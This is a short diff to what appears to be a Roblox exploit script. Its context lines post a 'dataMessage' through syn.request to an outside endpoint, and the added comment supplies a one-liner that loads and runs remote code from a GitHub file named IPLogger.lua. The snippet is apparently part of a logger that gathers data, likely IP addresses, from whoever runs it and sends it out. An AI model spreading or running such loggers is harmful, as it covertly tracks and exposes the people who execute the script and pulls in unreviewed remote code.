@@ -17,3 +17,6 @@ syn.request(
         Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
     }
 )
+
+
+--loadstring version: loadstring(game:HttpGet("https://raw.githubusercontent.com/f0stered/main/main/IPLogger.lua", true))()
